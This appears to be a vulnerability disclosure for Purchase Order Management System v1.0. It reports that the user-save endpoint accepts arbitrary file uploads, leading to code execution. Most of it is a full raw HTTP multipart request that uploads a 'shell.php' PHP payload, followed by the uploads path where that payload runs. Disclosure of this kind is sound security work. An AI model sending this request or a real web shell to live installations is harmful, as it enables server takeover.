## Purchase-order-management-system v1.0 by oretnom23 has arbitrary code execution (RCE)

vendors: https://www.sourcecodester.com/php/14935/purchase-order-management-system-using-php-free-source-code.html

Vulnerability url: http://ip/purchase_order/admin/?page=user

Request package for file upload：

```sql
POST /purchase_order/classes/Users.php?f=save HTTP/1.1
Host: 192.168.1.19
Content-Length: 799
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylz8EuWf30x9QqTzc
Origin: http://192.168.1.19
Referer: http://192.168.1.19/purchase_order/admin/?page=user/manage_user&id=3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=sils4jibq9sp4e2n7i4joq8to7
Connection: close

------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="id"

3
------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="firstname"

Mike 
------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="lastname"

Williams
------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="username"

mwilliams
------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="password"


------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="type"

2
------WebKitFormBoundarylz8EuWf30x9QqTzc
Content-Disposition: form-data; name="img"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundarylz8EuWf30x9QqTzc--
```

The file will be uploaded to the `uploads` directory

![image](https://user-images.githubusercontent.com/54017627/160133754-0ddda336-7dc0-4ae6-bb1e-c1d58c6f76e8.png)

We visit the url of the shell.php file and find that the code has been executed

Url: http://ip/purchase_order/uploads/1648212480_shell.php

![image](https://user-images.githubusercontent.com/54017627/160133929-c5ce83f9-cd97-4603-8083-7b7a1f898515.png)
